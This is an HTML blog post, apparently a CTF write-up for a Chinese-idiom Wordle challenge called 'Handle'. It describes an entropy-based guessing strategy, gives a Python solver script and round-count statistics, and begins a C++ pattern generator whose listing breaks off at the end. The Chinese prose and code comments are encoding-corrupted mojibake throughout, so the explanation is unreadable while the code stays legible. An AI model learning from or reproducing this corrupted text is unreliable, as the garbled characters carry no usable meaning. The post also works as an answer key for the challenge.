    <content type="html"><![CDATA[<p>è™ç¬¦ç­¾åˆ°é¢˜handleï¼Œè¿å®˜æ–¹wpéƒ½å«ä½ ç›´æ¥éšä¾¿é€‰ä¸€ä¸ªçœ‹èµ·æ¥è¿‡å¾—å»çš„å°±è¡Œï¼Œç¡®å®æ˜¯handleé‡Œå¯¹äºå¼€å¤´çš„æˆè¯­åŸºæœ¬æ²¡å•¥è®²ç©¶ï¼Œä½†æ˜¯åæ­£åšéƒ½åšäº†ä¸å¦‚åšå®Œåšå¥½ï¼Œäºæ˜¯å°±åˆèŠ±äº†äº›æ—¶é—´è·Ÿç€3b1bçš„wordleè§†é¢‘åšäº†ä¸ªè¿™ï¼Œä¸»è¦æ˜¯<b>ä¿¡æ¯è®º</b>çš„åº”ç”¨å’Œå¯¹C++çš„é¡ºä¾¿å®æ“</p><span id="more"></span><h1 id="HandleCrack-ä¿¡æ¯è®º"><a href="#HandleCrack-ä¿¡æ¯è®º" class="headerlink" title="HandleCrack[ä¿¡æ¯è®º]"></a>HandleCrack[ä¿¡æ¯è®º]</h1><p>ä¸ºäº†æ–‡ç« é•¿åº¦å°½é‡çŸ­ç‚¹ï¼ˆæ‡’ï¼‰ï¼Œä»¥ä¸‹æ˜¯æˆ‘ç•¥è¿‡ä½†è¯»è€…åº”è¯¥çŸ¥é“çš„å†…å®¹ï¼š</p><ul><li><a href="https://handle.antfu.me/">handle</a>å’Œwordleçš„è§„åˆ™</li><li>E = âˆ‘ -p_i * log(p_i)</li></ul><p>ï¼ˆç›´æ¥å»çœ‹ä¸€é<a href="www.bilibili.com/video/BV1zZ4y1k7Jw">3b1bè§†é¢‘</a>å¤šå¥½ï¼Œä»¥åŠå¦ä¸€ä¸ª<a href="www.bilibili.com/video/BV1A3411p7Xv">3b1bçš„è¡¥å……è¯´æ˜</a>ï¼‰</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>&gt;&gt; é—®ï¼šåŸé¢˜ä¸æ˜¯pyå—æ€ä¹ˆè¦æ‰¯cppï¼Ÿ</p><p>ç­”ï¼šä¸ä¼šä¼˜åŒ–pyæ‰€ä»¥æˆ‘çš„cppè·‘èµ·æ¥åº”è¯¥æ¯”pyå¿«ï¼ˆ?ï¼‰ï¼Œè€Œä¸”cppçš„ä½æ“ä½œå’Œæ‰‹åŠ¨å†…å­˜ç®¡ç†æˆ‘çœ‹ç€è¦æ”¾å¿ƒä¸€ç‚¹ï¼ˆæ‰§å¿µï¼ˆä¸è¦å­¦æˆ‘ï¼ˆå‘œ</p><p>&gt;&gt; é—®ï¼šä¸æ˜¯éšä¾¿é€‰ä¸€ä¸ªå½“å¼€å¤´è¯å°±å¯ä»¥äº†å—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦è´¹è¿™ä¹ˆå¤§åŠ›æ°”æ•´è¿™äº›ï¼Ÿ</p><p>ç­”ï¼šä¸€ï¼Œçœ‹äº†wordleçš„è§†é¢‘è‡ªå·±ä¹Ÿæƒ³å®æ“ä¸€ä¸‹ï¼›äºŒï¼Œåæ­£æ¯”èµ›éƒ½ç»“æŸäº†ä¸å¦‚åšå®Œå–„ç‚¹ï¼›ä¸‰ï¼Œä¸æ±‚å‡ºæ¥æˆ‘ä¼šç¡ä¸ç€è§‰çš„ã€‚æ€»ä¹‹å°±æ˜¯è™½ç„¶ç¡®å®æ ¹æ®æœ€åçš„ç»“æœçœ‹æ¥ï¼Œåªè¦é€‰ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„æˆè¯­ï¼Œæˆ–è€…å¤šè¯•å‡ ä¸ªå¼€å¤´è¯ï¼Œå°±èƒ½è¾¾åˆ°å¾ˆå¥½çš„æ•ˆæœäº†ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯æƒ³åšä¸€ä¸‹ï¼Œå› ä¸ºæŒºæœ‰è¶£çš„</p><h2 id="é¢˜é¢"><a href="#é¢˜é¢" class="headerlink" title="é¢˜é¢"></a>é¢˜é¢</h2><p>Handleåœ¨4è½®å†…æ‰¾åˆ°ç­”æ¡ˆï¼Œé‡å¤512æ¬¡ï¼Œæ¯æ¬¡çš„é€‰è¯ç”±<code>random.choice()</code>äº§ç”Ÿ</p><p>ç„¶åå°±æ˜¯ä»–è¿™ä¸ªäº¤äº’æœ‰ç‚¹éš¾å—ï¼Œç”±äºä½ è¾“å…¥è¯è¯­åå®ƒè¿”å›çš„æ‹¼éŸ³å¯¹é”™ä¿¡æ¯æ˜¯ä»¥é¢œè‰²æ ‡æ³¨çš„ï¼Œè™½ç„¶å¬ç¾¤é‡Œè¯´å­—èŠ‚æµä¸‹é¢œè‰²å¯ä»¥æ¯”è¾ƒæ–¹ä¾¿çš„è·å–ï¼Œä½†æ˜¯åæ­£åé¢æˆ‘å¤ç°çš„æ—¶å€™æ˜¯æ²¡æœ‰ç®¡è¿™ä¸ªçš„</p><p><a href="https://kyriota.com/html/DLfiles/%E8%99%8E%E7%AC%A6handle.zip">ä¸‹è½½é“¾æ¥(githubæº)</a></p><h2 id="Handleæ‚è°ˆ"><a href="#Handleæ‚è°ˆ" class="headerlink" title="Handleæ‚è°ˆ"></a>Handleæ‚è°ˆ</h2><p>wordleæ˜¯å›ºå®š5ä¸ªå­—æ¯ï¼Œæ¯ä¸ªå­—æ¯æ¡†æœ‰ä¸‰ç§æƒ…å†µï¼Œæ‰€ä»¥ç†è®ºä¸Šæ€»å…±çš„å¯èƒ½æ€§æ˜¯3^5ç§</p><p>handleæ˜¯å›ºå®š4ä¸ªæ‹¼éŸ³ï¼Œæ¯ä¸ªå­—çš„æ‹¼éŸ³åˆ†ä¸ºå£°æ¯ï¼ŒéŸµæ¯ï¼Œå£°è°ƒï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä½œæ˜¯12ä¸ªå­—æ¯çš„wordleï¼Œä¹Ÿæ˜¯æ¯ä¸ªæ‹¼éŸ³æ¡†æœ‰ä¸‰ç§æƒ…å†µï¼Œç†è®ºå¯èƒ½æ€§æœ‰3^12ç§</p><h3 id="ç‰¹æ®ŠéŸµæ¯"><a href="#ç‰¹æ®ŠéŸµæ¯" class="headerlink" title="ç‰¹æ®ŠéŸµæ¯"></a>ç‰¹æ®ŠéŸµæ¯</h3><p>ä½†æ˜¯ä¸­æ–‡ä¸­åŒ…å«ç‰¹æ®ŠéŸµæ¯ï¼Œæ¯”å¦‚ enï¼Œerï¼Œei ç­‰ï¼Œä¸€ä¸ªéŸµæ¯å°±æ˜¯ä¸€ä¸ªæ³¨éŸ³çš„å­—ã€‚é‚£æ¯”å¦‚è¿™ä¸€è½®çŒœäº†è¯»éŸ³ä¸º en çš„ä¸€ä¸ªå­—ï¼Œåˆ™ä¸ç®¡æ‰æ²¡çŒœå¯¹ï¼Œéƒ½æŸå¤±äº†ä¸€ä¸ªä½ç½®ä¸Šå£°æ¯çš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯ enï¼Œei è¿™äº›å¯ä»¥å’Œå£°æ¯æ­é…ï¼Œåˆå¯ä»¥è‡ªå·±æ¥çš„ç‰¹æ®ŠéŸµæ¯ï¼Œå¯¹äº er è€Œè¨€ï¼Œç”±äº er ä¸èƒ½å’Œå£°æ¯ç»„åˆï¼Œä¼šæ›´ç‰¹æ®Šä¸€ç‚¹ï¼ˆé¡ºä¾¿ä¸€æï¼Œpyçš„æ‹¼éŸ³åº“å¾—å‡ºçš„æ‹¼éŸ³ä¸çŸ¥ä¸ºä½•å¯¹â€œäº†â€è¿™ä¸ªå­—ä¹Ÿæ²¡æœ‰éŸ³è°ƒï¼Œæ‰€ä»¥æœ‰äº›æ—¶å€™ä¸æ­¢ä¼šåœ¨å£°æ¯ä¸Šä¸ºç©ºï¼Œå£°è°ƒä¹Ÿæœ‰å¯èƒ½ä¸ºç©ºï¼‰</p><p>ä½†æ˜¯æˆ‘å·²ç»ä¸æƒ³æ€è€ƒäº†ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠ er å’Œ enï¼Œei ä¹‹ç±»çš„åŒç­‰å¤„ç†çš„ï¼Œä¹Ÿè®¸æŠŠ er å†å•ç‹¬åˆ†å‡ºæ¥åˆä¼šç¨å¾®ä¸ä¸€æ ·ä¸€ææï¼Œä½†æ˜¯æˆ‘çœŸçš„å·²ç»åœæ­¢æ€è€ƒäº†</p><h3 id="è¯åº“"><a href="#è¯åº“" class="headerlink" title="è¯åº“"></a>è¯åº“</h3><p>å…¶å®æˆ‘å½“æ—¶ä»¥ä¸ºä»–é¢˜ç›®æ²¡ç»™ä»£ç ï¼ŒæŸ¥äº†ä¸€ä¸‹å¸¸ç”¨æˆè¯­è²Œä¼¼ä¹Ÿå°±å‡ åƒä¸ªï¼Œæˆ‘å°±å»ç™¾åº¦æ±‰è¯­æ‰’äº†ä¸€ä¸ªç™¾åº¦çš„æˆè¯­è¯åº“ï¼Œé‚£ä¹Ÿæ‰4000ä¸ªè¯å•Šï¼Œå¥½å®¶ä¼™ç»“æœä»–ç»™çš„é‚£ä¸ªåˆ—è¡¨æœ‰å°†è¿‘ä¸¤ä¸‡å…­åƒä¸ªè¯ï¼ˆï¼Ÿï¼‰ï¼Œçœ‹äº†ä¸€ä¸‹æ˜¯ä»<a href="https://github.com/antfu/handle">è¿™é‡Œé¢</a>æ¬çš„ï¼Œé‡Œé¢ç”šè‡³æœ‰<b>â€œå¯å£å¯ä¹â€</b>ä¹‹ç±»çš„ç‰¹åˆ«å¥‡æ€ªçš„ä¸œè¥¿ï¼Œå“ˆå“ˆ (^ ^)</p><img src="/images/memes/TMDbloodpresure.jpg" height="100" width="100" /><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>è¿™ä¸ªexpé‡Œä¸åŒ…å«å¯¹ä¸Šé¢æåˆ°çš„ç‰¹æ®ŠéŸµæ¯çš„ç‰¹æ®Šå¤„ç†ï¼ŒåŒæ—¶ç›´æ¥ç”¨çš„å‡½æ•°returnçš„ä¿¡æ¯æ¥åé¦ˆçš„ï¼Œè€Œ<strong>ä¸æ˜¯é¢˜ç›®ç¯å¢ƒä¸‹çš„é¢œè‰²ä¿¡æ¯</strong></p><h3 id="åæ§½"><a href="#åæ§½" class="headerlink" title="åæ§½"></a>åæ§½</h3><p>expçš„æ€è·¯å¾ˆç®€å•ï¼Œçš„ç¡®åªéœ€è¦æ¯”è¾ƒéšä¾¿çš„é€‰æ‹©å¼€å±€çš„è¯è¯­å°±å¯ä»¥äº†ï¼Œç”šè‡³ç¬¬ä¸€ä¸ªè¯â€œä¸€ä¸ä¸è¯†â€åœ¨æœ€åç®—å‡ºæ¥çš„ä¿¡æ¯ç†µæ’åé‡Œé¢éƒ½å¾ˆé å‰ï¼Œåªè¦ä¸æ˜¯â€œå¯å£å¯ä¹â€è¿™ç§å¥‡æ€ªçš„è¯ï¼Œå°±å¯ä»¥åœ¨è¿æ°”çš„åŠ æŒä¸‹ç›´æ¥å‡ºflagï¼Œè¯´å®è¯è¿™ä¸ªflagæ˜¯å¿…é¡»è¦è¿æ°”çš„ï¼Œå› ä¸ºå°±ç®—æ˜¯æˆ‘æœ€åç®—å‡ºæ¥çš„ä¿¡æ¯ç†µæœ€é«˜çš„è¯ä»–ä¹Ÿä¸èƒ½ä¿è¯4è½®å‡ºç»“æœï¼Œæˆ‘å¾—åˆ°çš„å¹³å‡è½®æ¬¡å¤§æ¦‚æ˜¯2.62è½®ï¼ˆå’Œé¢˜ç›®æ¡ä»¶ä¸€æ ·éšæœºæŠ½å–æµ‹è¯•512æ¬¡ï¼‰ï¼Œè€Œè¢«æˆ‘ç›®å‡»åˆ°çš„æœ€å¤§è½®æ¬¡æ˜¯6è½®ï¼Œè™½ç„¶æˆ‘å†™çš„è¿™ä¸ªè„šæœ¬ä¼˜åŒ–æ¯”è¾ƒçƒ‚ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å½±å“æˆ‘è¯´ï¼šè¿™ä¸ªé¢˜ä»–åº”è¯¥çœ‹ä½ åˆ°æœ€åçš„å¹³å‡è½®æ¬¡æ˜¯å¦åˆæ ¼ï¼Œè€Œä¸æ˜¯çœ‹æœ€å¤§è½®æ¬¡ = =</p><p>åœ¨çš„<a href="https://mp.weixin.qq.com/s?__biz=MzU5Njg1NzMyNw==&mid=2247484500&idx=1&sn=35e43e11b29119544045fa7dfd56c10a&chksm=fe5d1cd4c92a95c208c93921a0b8f328cb92daf0630bc8a5ed7eaaafc30500fc44768beb0b6f&mpshare=1&scene=23&srcid=0324Ct2tOV94yqxYEa60Rbey&sharer_sharetime=1648094683578&sharer_shareid=c69a4128c20e54a8749107dca4adf514#rd">å®˜æ–¹wp</a>é‡Œå¯¹ä»–è‡ªå·±çš„expè¡¨ç¤ºï¼š</p><blockquote><p>è¿™ä¸ªè„šæœ¬ä¹Ÿä¸æ˜¯å¿…æˆåŠŸï¼Œä½†æ˜¯ä½“æ„ŸæˆåŠŸç‡éå¸¸é«˜ï¼Œå¹³å‡çŒœè¯æ¬¡æ•° 2.72ï¼Œä¹Ÿè®¸æ¢ä¸ªèµ·å§‹è¯å¯ä»¥æŠŠæœ€å¤§æ¬¡æ•°å‹åˆ° 3</p></blockquote><p>å“¥ä½ å¾—æœ‰æ•°æ®å•Šä¸è¦å‡­æ„Ÿè§‰å•Šï¼Œå‡ºé¢˜äººå¯èƒ½æ˜¯è§‰å¾—ä»–éšä¾¿é€‰äº†ä¸ªè¯å°±å¯ä»¥æŠŠå¹³å‡çŒœè¯æ•°å‹å€’2.72ï¼Œæ‰€ä»¥ä¼˜åŒ–ä¸€ä¸‹åº”è¯¥èƒ½è½»æ¾å‹å¾—å¾ˆä½ï¼Œä½†æ˜¯é—®é¢˜å°±æ˜¯å…¶å®è¿™äº›è¯è¯­çš„ä¿¡æ¯ç†µçš„åˆ†å¸ƒæ€»ä½“æ¥çœ‹éƒ½ç®—æ˜¯æ¯”è¾ƒé«˜çš„äº†ï¼Œæ€»å…±ä¸åˆ°2.6wä¸ªè¯ï¼Œ2.1wä¸ªè¯çš„ä¿¡æ¯ç†µåœ¨10ä»¥ä¸Šï¼Œæœ€é«˜çš„ä¿¡æ¯ç†µä¹Ÿå°±12.8755ï¼Œæ„æ€æ˜¯ä½ éšä¾¿é€‰ä¸­é‚£2.1wä¸ªä¿¡æ¯ç†µåœ¨10ä»¥ä¸Šçš„è¯çš„æ—¶å€™ï¼Œç†è®ºä¸Šå‰©ä¸‹çš„è¯æ•°çš„æœŸæœ›å°±åªæœ‰25.3ä¸ªï¼Œä½†3b1bè®²wordleçš„è§†é¢‘é‡Œæœ‰å¥è¯è¯´å¾—å¥½ï¼Œå°±ï¼Œâ€œæœŸæœ›æ˜¯æœŸæœ›ï¼Œå®é™…æ˜¯å®é™…â€ï¼ˆå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€ï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯é‚£å¥è¯ï¼Œæœ€å¥½å°±å­˜ä¸€ä¸‹é€‰æ‰‹çš„è½®æ¬¡ä¿¡æ¯ï¼Œæœ€åç®—ä¸€ä¸‹å¹³å‡è½®æ¬¡å¤Ÿä¸å¤Ÿå°</p><p>åœ¨æˆ‘æŠ½çš„512æŠ½é‡Œé¢å¤§æ¦‚æ˜¯è¿™ä¹ˆä¸ªåˆ†å¸ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">çŒœä¸­è½®æ¬¡ -| ä¸€å‘å…¥é­‚ |    2    |    3    |    4    |    5    |    6    |</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">å‘ç”Ÿæ¬¡æ•° -|    1    |   230   |   247   |   32    |    1    |    1    |</span><br></pre></td></tr></table></figure><img src="/images/handle_bar.png"/><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>æŒºæ— è„‘çš„ï¼Œpyæ°´å¹³æœ‰é™ï¼Œæœ‰äº›åœ°æ–¹ä¸å¤ªä¼˜é›…</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        exp    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">initials, finals, tones = [], [], []</span><br><span class="line"><span class="comment"># é¢„å…ˆå­˜äº†ä¸€ä¸‹æ‹¼éŸ³</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> idioms:</span><br><span class="line">    pinyin = get_pinyin(word)</span><br><span class="line">    initials.append(pinyin[<span class="number">0</span>])</span><br><span class="line">    finals.append(pinyin[<span class="number">1</span>])</span><br><span class="line">    tones.append(pinyin[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetWord</span>(<span class="params">words</span>):</span></span><br><span class="line">    <span class="comment"># æ ¹æ® E å¾—å‡ºå½“å‰æœ€ä¼˜è¯</span></span><br><span class="line">    wordLen = <span class="built_in">len</span>(words)</span><br><span class="line">    <span class="keyword">if</span> wordLen &gt; <span class="number">25000</span>: <span class="comment"># å¼€å¤´è¯å›ºå®š</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ç ”ç»é“¸å²&quot;</span></span><br><span class="line">    E = []</span><br><span class="line">    <span class="keyword">for</span> guessIndex <span class="keyword">in</span> <span class="built_in">range</span>(wordLen): <span class="comment"># æ— è„‘éå†ç®— E</span></span><br><span class="line">        partern, count, prob = [], [], []</span><br><span class="line">        <span class="keyword">for</span> ansIndex <span class="keyword">in</span> <span class="built_in">range</span>(wordLen):</span><br><span class="line">            result = []</span><br><span class="line">            result.append(check_part(initials[guessIndex],initials[ansIndex]))</span><br><span class="line">            result.append(check_part(finals[guessIndex],finals[ansIndex]))</span><br><span class="line">            result.append(check_part(tones[guessIndex],tones[ansIndex]))</span><br><span class="line">            findFlag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(partern)):</span><br><span class="line">                <span class="keyword">if</span> partern[i] == result:</span><br><span class="line">                    count[i] += <span class="number">1</span></span><br><span class="line">                    findFlag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> findFlag:</span><br><span class="line">                partern.append(result)</span><br><span class="line">                count.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(partern)):</span><br><span class="line">            p = count[i] / wordLen</span><br><span class="line">            prob.append(-p * log2(p))</span><br><span class="line">        E.append(<span class="built_in">sum</span>(prob))</span><br><span class="line">        print(<span class="string">&quot;\r&gt;&gt; E: &quot;</span> + <span class="built_in">str</span>(guessIndex), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&gt;&gt; max E: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">max</span>(E)))</span><br><span class="line">    <span class="keyword">return</span> words[argmax(E)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteWord</span>(<span class="params">words, result, guess</span>):</span></span><br><span class="line">    <span class="comment"># æŠŠä¸ç¬¦åˆåé¦ˆ partern çš„è¯åˆ æ‰</span></span><br><span class="line">    certain = []</span><br><span class="line">    uncertain = []</span><br><span class="line">    wrong = []</span><br><span class="line">    pinyin = get_pinyin(guess)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> result[i][j] == status.OK:</span><br><span class="line">                certain.append([pinyin[i][j],(i,j)])</span><br><span class="line">            <span class="keyword">elif</span> result[i][j] == status.MISS:</span><br><span class="line">                uncertain.append([pinyin[i][j],(i,j)])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                wrong.append([pinyin[i][j],(i,j)])</span><br><span class="line">    newWords = []</span><br><span class="line">    <span class="keyword">for</span> wordIndex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(words)):</span><br><span class="line">        pinyin = get_pinyin(words[wordIndex])</span><br><span class="line">        flag = <span class="literal">True</span> <span class="keyword">and</span> words[wordIndex] != guess</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> certain:</span><br><span class="line">            <span class="keyword">if</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]][i[<span class="number">1</span>][<span class="number">1</span>]] != i[<span class="number">0</span>]:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> uncertain:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]] <span class="keyword">or</span> i[<span class="number">0</span>] == pinyin[i[<span class="number">1</span>][<span class="number">0</span>]][i[<span class="number">1</span>][<span class="number">1</span>]]:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> wrong:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">in</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]]:</span><br><span class="line">                wrongCnt = pinyin[i[<span class="number">1</span>][<span class="number">0</span>]].count(i[<span class="number">0</span>])</span><br><span class="line">                certainCnt, uncertainCnt = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> certain:</span><br><span class="line">                    certainCnt += j.count(i[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> uncertain:</span><br><span class="line">                    uncertainCnt += j.count(i[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> wrongCnt &lt;= certainCnt + uncertainCnt:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        newWords.append(words[wordIndex])</span><br><span class="line">    <span class="keyword">return</span> newWords</span><br></pre></td></tr></table></figure>    </div></div><h2 id="æœ€ä¼˜å¼€å¤´"><a href="#æœ€ä¼˜å¼€å¤´" class="headerlink" title="æœ€ä¼˜å¼€å¤´"></a>æœ€ä¼˜å¼€å¤´</h2><p>æˆ‘å…¶å®ä¹‹å‰æƒ³è¿‡èƒ½ä¸èƒ½ç›´æ¥æ„é€ ä¸€ä¸ªæœ€ä¼˜å¼€å¤´ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå°±å†³å®šä»ä»–ç»™å‡ºçš„2.6wä¸ªè¯é‡Œé¢æ‰¾ä¸€ä¸ªæœ€ä¼˜å¼€å¤´</p><p>ç”±äºæ–‡ç« ä¸€å¼€å¤´è¯´çš„ä¼˜åŒ–é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘å°±<code>py2cpp()</code>äº†</p><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>é¦–å…ˆæˆ‘æŠŠæ‰€æœ‰è¯çš„æ‹¼éŸ³éƒ½é€šè¿‡pyçš„æ‹¼éŸ³åº“å¯¼å‡ºåˆ°äº†ç¡¬ç›˜ï¼Œæ— éŸµæ¯æ— å£°è°ƒçš„åœ°æ–¹ç”¨â€œ#â€è¿›è¡Œäº†å ä½ï¼Œç„¶åä¸ºäº†ä¹‹åä¸å†é‡å¤ç»Ÿè®¡ä¸€ä¸ªè¯å¦ä¸€ä¸ªè¯æ¯”è¾ƒå¾—å‡ºçš„patternï¼Œæˆ‘æŠŠæ‰€æœ‰parternå¯¼å‡ºï¼Œè¿™æ ·ä¹‹åæŸ¥è¡¨å°±å®Œäº‹äº†</p><p>è¿™ä¸€å—å€¼å¾—æ³¨æ„çš„åº”è¯¥ä¹Ÿå°±æ˜¯patternçš„<strong>å­˜å‚¨æ ¼å¼</strong>äº†</p><p>å› ä¸ºæ¯ä¸€ä¸ªæ‹¼éŸ³ä½æœ‰4ç§æƒ…å†µï¼šç¡®å®šå­˜åœ¨ä¸”ä½ç½®æ­£ç¡®ï¼Œç¡®å®šå­˜åœ¨ä½†ä½ç½®é”™è¯¯ï¼Œç¡®å®šä¸å­˜åœ¨ï¼Œä¸ç¡®å®šæ˜¯å¦å­˜åœ¨ï¼ˆç‰¹æ®ŠéŸµæ¯ï¼‰ï¼›è€Œæ€»å…±4ä¸ªæ±‰å­—ï¼Œæ¯ä¸ªæ±‰å­—3ä¸ªæ‹¼éŸ³ä½ï¼Œç”±äºçŠ¶æ€å…±4ç§ï¼Œä¸¤ä½å°±èƒ½è¡¨ç¤ºå®Œï¼ˆ00ï¼Œ01ï¼Œ10ï¼Œ11ï¼‰ï¼Œæ€»å…±éœ€è¦<code>4 * 3 * 2 = 24(bit)</code>ï¼Œåˆšå¥½3å­—èŠ‚ï¼Œæ‰€ä»¥ç”¨3ä¸ª<code>char</code>å°±å¯ä»¥å¡ä¸‹1ä¸ªpatternï¼Œè¿™éƒ¨åˆ†è¯¦è§ä¸‹æ–¹æŠ˜å ä»£ç ä¸­çš„<code>CalPattern()</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crackGen.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 